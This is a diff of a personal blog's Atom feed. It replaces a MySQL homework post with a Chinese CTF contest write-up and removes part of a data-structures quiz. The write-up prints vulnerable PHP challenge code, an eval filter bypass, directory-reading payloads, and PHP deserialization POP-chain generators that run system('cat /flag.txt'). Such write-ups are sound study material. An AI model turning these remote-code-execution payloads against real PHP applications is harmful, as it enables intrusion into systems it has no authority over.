@@ -3,62 +3,394 @@
     <title>d1omg blog</title>
     <link href="https://sharenjun.github.io/feed.xml" rel="self" />
     <link href="https://sharenjun.github.io" />
-    <updated>2024-11-06T21:28:24+08:00</updated>
+    <updated>2024-11-10T08:29:24+08:00</updated>
     <author>
         <name>d1omg</name>
     </author>
     <id>https://sharenjun.github.io</id>
 
     <entry>
-        <title>MySQL数据表的创建与管理</title>
+        <title>第七届大学生信息与安全竞赛决赛</title>
         <author>
             <name>d1omg</name>
         </author>
-        <link href="https://sharenjun.github.io/mysqlshu-ju-biao-de-chuang-jian-yu-guan-li.html"/>
-        <id>https://sharenjun.github.io/mysqlshu-ju-biao-de-chuang-jian-yu-guan-li.html</id>
+        <link href="https://sharenjun.github.io/di-qi-jie-da-xue-sheng-xin-xi-yu-an-quan-jing-sai-jue-sai.html"/>
+        <id>https://sharenjun.github.io/di-qi-jie-da-xue-sheng-xin-xi-yu-an-quan-jing-sai-jue-sai.html</id>
 
-        <updated>2024-11-06T21:14:11+08:00</updated>
+        <updated>2024-11-10T08:29:24+08:00</updated>
             <summary></summary>
         <content type="html">
             <![CDATA[
-                <h1 id="作业"><strong>作业</strong></h1>
-<p><a href="https://sharenjun.github.io/media/posts/15/">https://sharenjun.github.io/media/posts/15/</a></p><p><figure class="post__image"><img src="./assets/wps1.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps2.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img src="./assets/wps3.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps4.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img src="./assets/wps5.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps6.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img src="./assets/wps7.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps8.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="注意事项"><strong>注意事项</strong></h1>
-<p>MySQL 8.0.16之前的版本不支持CHECK约束，CHECK约束会被忽略。从MySQL 8.0.16版本开始，CHECK约束得到了支持和强制执行。</p><h1 id="安装"><strong>安装</strong></h1>
-<p><a href="https://downloads.mysql.com/archives/community">https://downloads.mysql.com/archives/community</a></p><p><figure class="post__image"><img src="./assets/wps9.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>用管理员方式运行cmd</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps10.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img src="./assets/wps11.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps12.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>进去改密码。</p><p><figure class="post__image"><img src="./assets/wps13.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps14.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>登录成功。</p><p><figure class="post__image"><img src="./assets/wps15.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>设置远程登录。</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps16.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="创建表"><strong>创建表</strong></h1>
-<p>create table teacher (</p><p>tchNo char(10),#教职工号</p><p>tchName varchar(10),#教师姓名</p><p>tchRand varchar(10),#教师职称</p><p>tchDepat varchar(20)#教师所在分院</p><p>);</p><p>create table course (</p><p>corNo char(10),#课程号</p><p>corName varchar(40),#课程名</p><p>corTime tinyint,#课时</p><p>corCredit decimal(4,1),#课程学分</p><p>corDepart varchar(20)#开课分院</p><p>);</p><p>create table teachcourse (</p><p>corNo varchar(10),#课程号</p><p>tchNo char(10),#教职工号</p><p>teachTime varchar(40),#教师授课时间</p><p>teachAddress varchar(20),#教师授课地点</p><p>teachsScore decimal(4,1)#学评教分数</p><p>);</p><p>create table userinfo (</p><p>userName char(10),#用户名</p><p>userPsd char(10)# 密码</p><p>);</p><p>create table grade(</p><p>stuNo char(8),#学生学号</p><p>corNo varchar(10),#课程号</p><p>score tinyint,#学生成绩</p><p>remark text #备注</p><p>);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps17.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="修改表与设置约束部分"><strong>修改表与设置约束部分</strong></h1>
-<h1 id="1">1.</h1>
-<p>alter table userinfo add userID int primary key auto_increment;</p><p><figure class="post__image"><img src="./assets/wps18.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps19.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="2">2.</h1>
-<p>alter table userinfo change column userPsd userPassword varchar(30) not null;</p><p><figure class="post__image"><img src="./assets/wps20.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps21.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="3">3.</h1>
-<p>alter table grade drop column remark;</p><p><figure class="post__image"><img src="./assets/wps22.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps23.jpg" alt="img"  data-is-external-image="true"></figure><figure class="post__image"><img loading="lazy" src="./assets/wps24.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="4">4.</h1>
-<p>alter table course add primary key (corNo);</p><p>alter table student add primary key (stuNo);</p><p>alter table teacher add primary key (tchNo);</p><p>alter table userinfo add primary key (userID);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps25.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="5">5.</h1>
-<p>再添加外键约束之前需要查看每个表中是否有重复的主键。这就是我们需要的外键</p><p>#添加 teachcourse 表的外键约束</p><p>alter table teachcourse add constraint fk_corNo foreign key (corNo) references course (corNo);</p><p><figure class="post__image"><img src="./assets/wps26.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>alter table teachcourse add constraint fk_tchNo foreign key (tchNo) references teacher (tchNo);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps27.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>#添加 grade 表的外键约束</p><p>alter table grade add constraint fk_stuNo foreign key (stuNo) references student (stuNo);</p><p>alter table grade add constraint fk_corNo foreign key (corNo) references course (corNo);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps28.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="6">6.</h1>
-<p>#student表</p><p>alter table student modify column stuName varchar(20) not null;</p><p>#teacher表</p><p>alter table teacher modify coulmn tchName varchar(10) not null;</p><p>#course表</p><p>alter table course modify coulmn corName varchar(40) not null;</p><p>#userinfo表</p><p>alter table userinfo </p><p>modify coulmn userName char(10) not null,</p><p>modify column userPassword varchar(30) not null;</p><p>#teachcourse表</p><p>无</p><p>#grade表</p><p>无</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps29.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="7"><strong>7.</strong></h1>
-<p>#设置唯一约束</p><p>alter table userinfo add unique (userName);</p><p><figure class="post__image"><img src="./assets/wps30.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps31.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="8"><strong>8.</strong></h1>
-<p>alter table grade alter score set default 0;</p><p><figure class="post__image"><img src="./assets/wps32.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps33.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="9"><strong>9.</strong></h1>
-<p>alter table student add constraint chk_stuNo check(stuNo regexp(“^[0-9]+$”));</p><p><figure class="post__image"><img src="./assets/wps34.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps35.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="10"><strong>10.</strong></h1>
-<p>alter table grade add constraint chk_score check(score between 0 and 150);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps36.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="11"><strong>11.</strong></h1>
-<p><figure class="post__image"><img loading="lazy" src="./assets/wps37.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>删除之前先备份数据库。</p><h1 id="删除主键约束"><strong>#删除主键约束</strong></h1>
-<p>##首先移除自增</p><p>alter table userinfo modify column userID int;</p><p>alter table userinfo drop primary key;</p><p><figure class="post__image"><img src="./assets/wps38.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps39.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="添加主键约束"><strong>#添加主键约束</strong></h1>
-<p>alter table userinfo add primary key (userID);</p><p><figure class="post__image"><img src="./assets/wps40.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>alter table userinfo modify column userID int auto_increment;</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps41.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps42.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="删除外键约束"><strong>#删除外键约束</strong></h1>
-<p>alter table teachcourse drop foreign key fk_corNo;</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps43.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="添加外键约束"><strong>#添加外键约束</strong></h1>
-<p>alter table teachcourse add constraint fk_corNo foreign key (corNo) references course(corNo);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps44.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="检查是否非空约束"><strong>#检查是否非空约束</strong></h1>
-<p>select constraint_name from information_schema.key_column_usage where table_name=”userinfo” and column_name = “userName”;</p><h1 id="删除非空约束"><strong>#删除非空约束</strong></h1>
-<p>alter table userinfo modify column userName char(10) default null;</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps45.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="添加非空约束"><strong>#添加非空约束</strong></h1>
-<p>alter table userinfo modify column userName char(10) not null;</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps46.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="删除唯一约束"><strong>#删除唯一约束</strong></h1>
-<p>alter table userinfo drop index userName;</p><h1 id="添加唯一约束"><strong>#添加唯一约束</strong></h1>
-<p>alter table userinfo add unique(userName); </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps47.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="删除检查约束"><strong>#删除检查约束</strong></h1>
-<p>alter table student drop check chk_stuNo;</p><h1 id="添加检查约束"><strong>#添加检查约束</strong></h1>
-<p>alter table student add constraint chk_stuNo check(stuNo,regexp(“^[0-9]+$”));</p><h1 id="删除默认约束"><strong>#删除默认约束</strong></h1>
-<p>alter table grade alter column score drop default;</p><h1 id="添加默认约束"><strong>#添加默认约束</strong></h1>
-<p>alter table grade alter column score set default 0;</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps48.jpg" alt="img"  data-is-external-image="true"></figure> </p><h1 id="开始测试约束"><strong>#开始测试约束</strong></h1>
-<h2 id="主键约束"><strong>主键约束</strong></h2>
-<p>插入,当我们插入两个重复的stuNo的时候就会报错。</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps49.jpg" alt="img"  data-is-external-image="true"></figure> </p><h2 id="非空约束"><strong>非空约束</strong></h2>
-<p>alter table userinfo modify column userName char(10) not null;</p><p>alter table userinfo modify column userPassword char(10) not null;</p><p>insert into userinfo (userName, userPassword, userID) value(‘’,’’,’3’);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps50.jpg" alt="img"  data-is-external-image="true"></figure> </p><h2 id="check约束"><strong>Check约束</strong></h2>
-<p>insert into student (stuNo, stuName, stuClass) values (‘A202001’, ‘王五’, ‘计算机科学与技术’);–失败的</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps51.jpg" alt="img"  data-is-external-image="true"></figure> </p><h2 id="默认值约束"><strong>默认值约束</strong></h2>
-<p><figure class="post__image"><img src="./assets/wps52.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>insert into  grade (corNo,stuNo) values (1,2);</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps53.jpg" alt="img"  data-is-external-image="true"></figure> </p><h2 id="唯一约束测试"><strong>唯一约束测试</strong></h2>
-<p>包含主键约束、非空约束、唯一约束</p><p><figure class="post__image"><img src="./assets/wps54.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps55.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps56.jpg" alt="img"  data-is-external-image="true"></figure> </p><h2 id="外键约束测试"><strong>外键约束测试</strong></h2>
-<p>重新创建两个表</p><p><figure class="post__image"><img src="./assets/wps57.jpg" alt="img"  data-is-external-image="true"></figure> </p><p><figure class="post__image"><img loading="lazy" src="./assets/wps58.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>命令:</p><p>#外键约束测试</p><p>CREATE DATABASE three_work;</p><p>– 创建students表</p><p>CREATE TABLE students (</p><p> student_id INT AUTO_INCREMENT PRIMARY KEY,</p><p> student_name VARCHAR(100) NOT NULL</p><p>);</p><p>– 创建enrollments表</p><p>CREATE TABLE enrollments (</p><p> enrollment_id INT AUTO_INCREMENT PRIMARY KEY,</p><p> student_id INT,</p><p> course_name VARCHAR(100) NOT NULL,</p><p> FOREIGN KEY (student_id) REFERENCES students(student_id)</p><p>);</p><p>– 插入学生数据</p><p>INSERT INTO students (student_name) VALUES (‘Alice’);</p><p>INSERT INTO students (student_name) VALUES (‘Bob’);</p><p>– 插入选课数据，其中student_id引用students表中存在的学生ID</p><p>INSERT INTO enrollments (student_id, course_name) VALUES (1, ‘Math’);</p><p>INSERT INTO enrollments (student_id, course_name) VALUES (2, ‘Physics’);</p><p>插入错误数据</p><p>– 尝试插入一个不存在的学生ID，这应该违反外键约束</p><p>INSERT INTO enrollments (student_id, course_name) VALUES (3, ‘Biology’); – 应该失败，因为没有ID为3的学生</p><p>记得开启外键约束。</p><p>SET GLOBAL foreign_key_checks = 1;</p><p>FLUSH PRIVILEGES;</p><p>NET STOP MYSQL;</p><p>NET START MYSQL;</p><h1 id="知识问答"><strong>知识问答</strong></h1>
-<p><figure class="post__image"><img src="./assets/wps59.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>Create database 数据库；</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps60.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>Ues database;</p><p>Create table table_name(变量名 类型,…);</p><p><figure class="post__image"><img src="./assets/wps61.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>主键:primary key</p><p>外键:foreign key</p><p>默认值约束:default</p><p>唯一约束:unqiue</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps62.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>主键</p><p><figure class="post__image"><img src="./assets/wps63.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>外键</p><p><figure class="post__image"><img loading="lazy" src="./assets/wps64.jpg" alt="img"  data-is-external-image="true"></figure> </p><p>默认值约束</p>
+                <h1 id="wucanrce">wucanrce</h1>
+<pre><code class="language-php">#源码
+&lt;?php
+echo &quot;get只接受code欧,flag在上一级目录&lt;br&gt;&quot;;
+$filename = __FILE__;
+highlight_file($filename);
+if(isset($_GET[&#39;code&#39;])){
+    if (!preg_match(&#39;/session_id\(|readfile\(/i&#39;, $_GET[&#39;code&#39;]))
+
+     {
+        if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;code&#39;])) {
+                @eval($_GET[&#39;code&#39;]);
+            }
+       
+    }
+    else{
+        die(&quot;不让用session欧，readfile也不行&quot;);
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="方法一">方法一</h2>
+<pre><code class="language-payload">参考链接
+https://mp.weixin.qq.com/s/eQlZeeUigFIF-xQCTrs88Q
+</code></pre>
+<pre><code>getallheaders 获取全部 HTTP 请求头信息
+array_values 返回数组中所有的值
+array_pop 出栈---这里栈中最后一个值是http请求头中最前面的值。也就是Host上面。
+</code></pre>
+<figure class="post__image"><img loading="lazy" src="https://sharenjun.github.io/media/posts/16/Pasted-image-20241110082057.png" alt="Image description" width="2560" height="1600"  sizes="100vw" srcset="https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-xs.png 300w ,https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-sm.png 480w ,https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-md.png 768w ,https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-lg.png 1024w ,https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-xl.png 1360w ,https://sharenjun.github.io/media/posts/16/responsive/Pasted-image-20241110082057-2xl.png 1600w"></figure><h2 id="方法二">方法二</h2>
+<pre><code class="language-payload">参考链接
+https://blog.csdn.net/2301_76690905/article/details/133808536
+</code></pre>
+<p>禁用session和readfile，那我只能现场当赌狗了。</p><pre><code class="language-payload">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));
+var_dump(highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))));
+</code></pre>
+<h1 id="unserialize">unserialize</h1>
+<p>赛后复现其他思路。感谢0ray师傅们的wp提供更多的思路</p><pre><code class="language-php">&lt;?php
+# 源码
+highlight_file(__FILE__);
+error_reporting(0);
+class AAA{
+    public $aear;
+    public $string;
+    public function __construct($a){
+        $this -&gt; aear = $a;
+    }
+    function __destruct()
+    {
+        echo $this -&gt; aear;
+    }
+    public function __toString()
+    {
+        $new = $this -&gt; string;
+        return $new();
+    }
+
+}
+
+class BBB {
+    private $pop;
+
+    public function __construct($string) {
+        $this -&gt; pop = $string;
+    }
+
+    public function __get($value) {
+        $var = $this -&gt; $value;
+        $var[$value]();
+    }
+}
+
+class DDD{
+    public $bag;
+    public $magazine;
+
+    public function __toString()
+    {
+        $length = @$this -&gt; bag -&gt; add();
+        return $length;
+    }
+    public function __set($arg1,$arg2)
+    {
+        if($this -&gt; magazine -&gt; tower)
+        {
+            echo &quot;really??&quot;;
+        }
+    }
+}
+
+class EEE{
+    public $d=array();
+    public $e;
+    public $f;
+    public function __get($arg1){
+        $this-&gt;d[$this-&gt;e]=1;
+        if ($this-&gt;d[]=1){
+            echo &#39;nononononnnn!!!&#39;;
+        }
+        else{
+            eval($this-&gt;f);
+        }
+    }
+}
+
+class FFF{
+    protected $cookie;
+
+    protected function delete() {
+        return $this -&gt; cookie;
+    }
+
+    public function __call($func, $args) {
+        echo &#39;hahahhhh&#39;;
+        call_user_func([$this, $func.&quot;haha&quot;], $args);
+    }
+}
+class GGG{
+    public $green;
+    public $book;
+    public function __invoke(){
+        if(md5(md5($this -&gt; book)) == 666) {
+            return $this -&gt; green -&gt; pen;
+        }
+    }
+}
+
+if(isset($_POST[&#39;UP&#39;])) {
+    unserialize($_POST[&#39;UP&#39;]);
+}
+</code></pre>
+<h2 id="方法一-1">方法一</h2>
+<pre><code class="language-php">#https://mp.weixin.qq.com/s/eQlZeeUigFIF-xQCTrs88Q
+&lt;?php
+class AAA{
+    public $aear;
+    public $string;
+    public function __construct($ggg){
+        $this -&gt; string = $ggg;
+        $this -&gt; aear = $this;
+    }
+
+}
+
+class BBB {
+    private $pop;
+
+    public function __construct() {
+        // $this -&gt; pop = $string;
+    }
+}
+
+class DDD{
+    public $bag;
+    public $magazine;
+    public function __construct() {
+        // $this -&gt; pop = $string;
+    }
+}
+
+class EEE{
+    public $d=array();
+    public $e;
+    public $f;
+    public function __construct($cmd) {
+        $this-&gt;e = &#39;a&#39;;
+        $this-&gt;d[$this-&gt;e] = &amp;$this-&gt;d;
+        $this-&gt;f = $cmd;
+    }
+}
+
+class FFF{
+    protected $cookie;
+
+    public function __construct() {
+
+    }
+}
+class GGG{
+    public $green;
+    public $book;
+    public function __construct($green) {
+        $this-&gt;book = &quot;SYr76Q==&quot;;
+        $this-&gt;green = $green;
+    }
+}
+
+
+$green = new EEE(&quot;system(&#39;cat /flag.txt&#39;);&quot;);
+
+$ggg = new GGG($green);
+
+$a = new AAA($ggg);
+
+echo urlencode(serialize($a));
+# 两个绕过一个用了 引用、一个用了爆破
+</code></pre>
+<h2 id="方法二-1">方法二</h2>
+<pre><code class="language-php">
+&lt;?php
+# https://mp.weixin.qq.com/s/eQlZeeUigFIF-xQCTrs88Q
+highlight_file(__FILE__);
+error_reporting(0);
+class AAA{
+    public $aear;
+    public $string;
+    public function __construct($a){
+        $this -&gt; aear = $a;
+    }
+    function __destruct()
+{
+        echo &quot;11111&quot;;
+        echo $this -&gt; aear;
+    }
+    public function __toString()
+{
+        $new = $this -&gt; string;
+        return $new();
+    }
+
+}
+
+class BBB {
+    private $pop;
+
+    public function __construct($string) {
+        $this -&gt; pop = $string;
+    }
+
+    public function __get($value) {
+        $var = $this -&gt; $value;
+        $var[$value]();
+    }
+}
+
+class DDD{
+    public $bag;
+    public $magazine;
+
+    public function __toString()
+{
+        $length = @$this -&gt; bag -&gt; add();
+        return $length;
+    }
+    public function __set($arg1,$arg2)
+{
+        if($this -&gt; magazine -&gt; tower)
+        {
+            echo &quot;really??&quot;;
+        }
+    }
+}
+
+class EEE{
+    public $d=123;
+    public $e;
+    public $f=&#39;system(&quot;cat /flag.txt&quot;);&#39;;
+    public function __get($arg1){
+        $this-&gt;d[$this-&gt;e]=1;
+        if ($this-&gt;d[]=1){
+            echo &#39;nononononnnn!!!&#39;;
+            }
+        else{
+            eval($this-&gt;f);
+            }
+    }
+}
+
+class FFF{
+    protected $cookie;
+
+    protected function delete() {
+        return $this -&gt; cookie;
+    }
+
+    public function __call($func, $args) {
+        echo &#39;hahahhhh&#39;;
+        call_user_func([$this, $func.&quot;haha&quot;], $args);
+    }
+}
+class GGG{
+    public $green;
+    public $book;
+    public function __invoke(){
+        if(md5(md5($this -&gt; book)) == 666) {   
+            return $this -&gt; green -&gt; pen;
+        }
+    }
+}
+
+if(isset($_POST[&#39;UP&#39;])) {
+    unserialize($_POST[&#39;UP&#39;]);
+}
+
+$a2 = new AAA(1);
+$g = new GGG();
+$g -&gt; book = &quot;11h7g&quot;;
+$e = new EEE();
+
+$g -&gt; green = $e;
+$a2 -&gt; string = $g;
+$a1 = new AAA($a2);
+echo serialize($a1);
+</code></pre>
+<h2 id="方法三">方法三</h2>
+<pre><code class="language-php">&lt;?php
+
+for($a=1;$a&lt;=9999;$a++){
+    $b=md5(md5($a));
+    if($b==666){
+        printf($b);
+        printf(&quot;\n&quot;);
+        printf($a);
+    }
+}
+
+//md5(md5(&quot;string&quot;+$a)) == 666
+# 我的解法,爆破jio本
+</code></pre>
+<pre><code class="language-php">&lt;?php
+class AAA{
+    public $aear;
+    public $string;
+}
+class BBB
+{
+    private $pop;
+}
+
+class DDD{
+    public $bag;
+    public $magazine;
+}
+
+
+class EEE{
+    public $d=array();
+    public $e;
+    public $f;
+}
+
+class FFF
+{
+    protected $cookie;
+}
+
+class GGG
+{
+    public $green;
+    public $book;
+}
+
+$a=new AAA;
+$g=new GGG;
+$e=new EEE;
+$a-&gt;aear=new AAA;
+$a-&gt;aear-&gt;string=$g;
+$g-&gt;book=213;
+$g-&gt;green=$e;
+$e-&gt;e=9223372036854775807;
+//$e-&gt;f=&quot;system(&#39;ls ../&#39;);&quot;;
+//$e-&gt;f=&quot;system(&#39;cat /flag&#39;);&quot;;
+
+$e-&gt;f=&quot;system(&#39;dir&#39;);&quot;;
+echo serialize($a);
+
+# 一个绕过用的爆破。另外一个方法php数组溢出。
+</code></pre>
+<h1 id="web1-没解出来">web1 没解出来</h1>
+<p>fuzz几下禁用了一些函数。bp爆破频率设置太快了。给ban了一小时。</p>
             ]]>
         </content>
     </entry>
@@ -145,463 +477,6 @@ $b=&#39;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker
 echo waf(serialize($b));
 # 输出s:179:&quot;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminO:4:&quot;Info&quot;:2:{s:3:&quot;age&quot;;i:20;s:8:&quot;nickname&quot;;s:8:&quot;wangsulu&quot;;}&quot;;s:8:&quot;jiadaqu&quot;;}&quot;;
 </code></pre>
-
-            ]]>
-        </content>
-    </entry>
-    <entry>
-        <title>数据结构题练习2</title>
-        <author>
-            <name>d1omg</name>
-        </author>
-        <link href="https://sharenjun.github.io/shu-ju-jie-gou-ti-lian-xi-2.html"/>
-        <id>https://sharenjun.github.io/shu-ju-jie-gou-ti-lian-xi-2.html</id>
-
-        <updated>2024-10-11T23:04:27+08:00</updated>
-            <summary></summary>
-        <content type="html">
-            <![CDATA[
-                <h1 id="单选题">单选题</h1>
-<h2 id="链表不具备的特点是">链表不具备的特点是()</h2>
-<p>A. 不必事先估计存储空间
-B. 随机访问
-C. 插入删除时不需移动元素
-D. 所需空间与线性表成正比</p><p>答案:B</p><p>解释:链表的访问是需要从头结点/无头结点的第一个节点开始顺序的访问。一个个的遍历过去。所以链表不具备随机访问的特点。只有顺序表才具有随机访问的特点。因为顺序表是由数组构成的。</p><h2 id="在单链表指针为p的结点之后插入指针为s的结点正确的操作是">在单链表指针为p的结点之后插入指针为s的结点,正确的操作是()</h2>
-<p>A. p-&gt;next=s;s-&gt;next=p-&gt;next;
-B. p-&gt;next=s;p-&gt;next=s-&gt;next;
-C. s-&gt;next=p-&gt;next;p-&gt;next=s;
-D. p-&gt;next=s-&gt;next;p-&gt;next=s</p><p>答案:C</p><p>解释:
-<figure class="post__image"><img loading="lazy" src="https://sharenjun.github.io/media/posts/13/image-20241011230959881.png" alt="Image description" width="740" height="404"  sizes="100vw" srcset="https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-xs.png 300w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-sm.png 480w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-md.png 768w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-lg.png 1024w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-xl.png 1360w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011230959881-2xl.png 1600w"></figure></p><h2 id="在顺序表中只要知道就可以求出任意一个结点的存储地址">在顺序表中,只要知道(),就可以求出任意一个结点的存储地址</h2>
-<p>A. 向量大小
-B. 结点大小
-C. 基地址
-D. 基地址和结点大小</p><p>答案:D</p><p>解释:基地址相当于顺序表的起始地址。按照节点大小开始计算。基地址=0x02,结点大小为4. 0x02+4</p><h2 id="两个指针p和q分别指向单链表的两个元素p所指元素是q所指元素前驱的条件是">两个指针P和Q,分别指向单链表的两个元素,P所指元素是Q所指元素前驱的条件是()</h2>
-<p>A. P==Q
-B. P-&gt;next==Q-&gt;next
-C. Q-&gt;next==P
-D. P-&gt;next==Q</p><p>答案:D</p><p>解释:
-<figure class="post__image"><img loading="lazy" src="https://sharenjun.github.io/media/posts/13/image-20241011231430237.png" alt="Image description" width="887" height="325"  sizes="100vw" srcset="https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-xs.png 300w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-sm.png 480w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-md.png 768w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-lg.png 1024w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-xl.png 1360w ,https://sharenjun.github.io/media/posts/13/responsive/image-20241011231430237-2xl.png 1600w"></figure></p><h2 id="在单链表中增加头结点的目的是">在单链表中,增加头结点的目的是()</h2>
-<p>A. 方便运算的实现
-B. 使单链表至少有一个结点
-C. 说明该单链表是线性表的链式存储结构
-D. 标志表中首结点的位置</p><p>答案:A</p><p>解释:头结点在单链表中通常用来简化操作的实现，因为它避免了对链表特殊位置（如第一个结点）的特殊处理。在有头结点的单链表中，插入、删除等操作可以在所有结点位置使用统一的方法处理，而不必单独考虑头部位置的不同情况。这提高了算法的通用性和代码的简洁性。</p><h2 id="对具有n个结点的线性表进行插入或删除操作所需的算法时间复杂度为">对具有n个结点的线性表进行插入或删除操作,所需的算法时间复杂度为()</h2>
-<p>A. O(nlog2n)
-B. O(log2n)
-C. O(n2)
-D. O(n)</p><p>答案:D</p><p>解释:</p><p>假设有4个节点。需要进行插入。在头部插入一个元素就需要移动4-1次。在尾部插入不需要移动。如果删除的是头部元素就需要移动4-1次。在尾部删除就不需要移动。将节点数量扩大也类似。</p><p>移动元素的数量最多是n-1个。不会达到n，因为不需要移动要插入的位置或者删除的位置本身</p><h2 id="设p为指向单循环链表上某结点的指针则p的直接前驱">设p为指向单循环链表上某结点的指针,则*p的直接前驱()</h2>
-<p>A. 查找时间复杂度为O(n)
-B. 查找结点的次数约为n
-C. 找不到
-D. 查找时间复杂度为0(1)</p><p>答案:A</p><p>解释:要寻找*p的直接前驱，就需要一个个的遍历。</p><h2 id="用链表表示线性表的优点是">用链表表示线性表的优点是()</h2>
-<p>A. 便于进行插入和删除操作
-B. 元素的物理顺序与与逻辑顺序一致
-C. 占用的存储空间较顺序表少
-D. 便于随机存取</p><p>答案:A</p><p>解释:链表的插入和删除都是由指针实现的。只要改变next指针即可。</p><h2 id="在有n个结点的顺序表上做插入、删除结点运算的时间复杂度为。">在有n个结点的顺序表上做插入、删除结点运算的时间复杂度为()。</h2>
-<p>A. O(log2n)
-B. O(n2)
